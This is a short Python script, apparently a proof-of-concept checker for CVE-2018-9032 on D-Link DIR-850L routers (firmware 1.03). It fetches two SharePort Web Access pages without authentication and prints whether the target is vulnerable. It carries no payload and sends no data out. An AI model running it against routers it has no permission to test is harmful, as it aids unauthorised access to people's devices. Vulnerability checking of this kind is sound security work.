#Device: D-Link DIR-850L Firmware: 1.03
import requests
import re
import sys
from colorama import Fore

description= r"""
 -----------------------------------------------------------------------------
|                                                                            |
|                                                                            |
|                                                                            |
|                                 Hyo-In                                     |
|                                                                            |
|                                                                            |
|                                                                            |
 -----------------------------------------------------------------------------
"""

def exploit(target, port):
	s = requests.Session()
	count=0

	URL1 = 'http://'+target+':'+port+'/category_view.php'
	URL2 = 'http://'+target+':'+port+'/folder_view.php'

	res1 = s.get(URL1)
	res2 = s.get(URL2)

	if re.search('SharePort Web Access',str(res1.text)):
		count=count+1
	if re.search('SharePort Web Access', str(res2.text)):
		count=count+1
	
	if count>1:
		print (Fore.GREEN+" [+] Vulnerable to CVE-2018-9032"+Fore.RESET)
	else:
		print (Fore.YELLOW+" [-] Not Vulnerable to CVE-2018-9032"+Fore.RESET)

# Main
if __name__== "__main__":
	print description
	if len(sys.argv) is not 3:
		print(Fore.YELLOW+"[-] Example: python cve-2018-9032.py <Target IP> <Port>"+Fore.RESET)
		sys.exit()
	else:
		exploit(sys.argv[1], sys.argv[2])
